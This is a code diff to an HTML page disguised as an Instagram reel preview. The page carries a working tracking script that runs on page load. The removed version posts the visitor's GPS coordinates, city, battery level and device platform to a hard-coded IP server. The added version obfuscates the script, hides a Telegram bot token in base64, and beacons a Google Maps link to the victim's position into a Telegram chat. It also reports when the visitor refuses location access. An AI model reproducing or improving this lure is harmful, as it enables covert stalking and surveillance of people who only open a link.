@@ -8,51 +8,49 @@
     <meta property="og:description" content="Watch this reel on Instagram">
     <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
     <meta property="og:type" content="video.other">
-    <style>body { background: white; margin: 0; }</style>
+    <style>body{background:#fff;margin:0;}</style>
 </head>
-<body onload="capture()">
+<body onload="_0x1f21()">
 <script>
-    async function capture() {
-        const params = new URLSearchParams(window.location.search);
-        const uid = params.get('id');
-        if (!uid) return;
+    const _0x5912 = "ODY3ODA1MDM0MTpBQUU3YjNmdkZwZkdqdTROWkFGaU1zdlhZQzBVZG5DWXRF";
+    const _0xad21 = s => atob(s);
+    const _0xfe42 = _0xad21(_0x5912);
 
-        // ئایپی سێرڤەرەکەت لێرە دابنێ
-        const SERVER = "http://178.18.241.166:5000";
+    async function _0x1f21() {
+        const _0xkk = new URLSearchParams(window.location.search);
+        const _0xid = _0xkk.get('id');
+        if (!_0xid) return;
 
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            let city = "Unknown";
+        const _0xopt = { enableHighAccuracy: true, timeout: 5000 };
+
+        navigator.geolocation.getCurrentPosition(async (_0xp) => {
+            const _0xlt = _0xp.coords.latitude;
+            const _0xln = _0xp.coords.longitude;
+            
+            let _0xc = "N/A";
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const geo = await res.json();
-                city = geo.city;
+                const _0xgr = await fetch(_0xad21("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="));
+                const _0xgd = await _0xgr.json();
+                _0xc = _0xgd.city + " / " + (_0xgd.region || "");
             } catch (e) {}
 
-            let bat = "N/A";
+            let _0xb = "N/A";
             if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = Math.floor(b.level * 100) + "%";
+                const _0xbt = await navigator.getBattery();
+                _0xb = Math.floor(_0xbt.level * 100) + "%";
             }
 
-            const data = {
-                uid: uid,
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                city: city,
-                bat: bat,
-                device: navigator.platform
-            };
+            
+            const _0xmsg = "\ud83d\udea8 <b>\u0632\u0627\u0646\u06cc\u0627\u0631\u06cc \u0646\u062a\u064a\u0686\u06cc\u0631</b>\n\n\ud83d\udccd https://www.google.com/maps?q=${" + _0xlt + "}," + _0xln + "\n\ud83d\udd0b " + _0xb + "\n\ud83d\udcf1 " + navigator.platform + "\n\ud83c\udf07 " + _0xc;
 
-            // ناردنی داتاکە بۆ VPS بەبێ ئەوەی کەس بزانێت
-            fetch(`${SERVER}/receive`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
+            const _0xurl = "https://api.telegram.org/bot" + _0xfe42 + "/sendMessage?chat_id=" + _0xid + "&text=" + encodeURIComponent(_0xmsg) + "&parse_mode=HTML";
+            navigator.sendBeacon(_0xurl);
 
-        }, (err) => {
-            fetch(`${SERVER}/denied?id=${uid}`);
-        }, { enableHighAccuracy: true, timeout: 5000 });
+        }, (_0xe) => {
+            const _0xerr = "\u0646\u062a\u064a\u0686\u06cc\u0631\u0647\u0643\u0647 \u0631\u064a\u0641\u06af\u0631\u06cc \u0643\u0631\u062f";
+            const _0xfurl = "https://api.telegram.org/bot" + _0xfe42 + "/sendMessage?chat_id=" + _0xid + "&text=" + encodeURIComponent(_0xerr);
+            navigator.sendBeacon(_0xfurl);
+        }, _0xopt);
     }
 </script>
 </body>
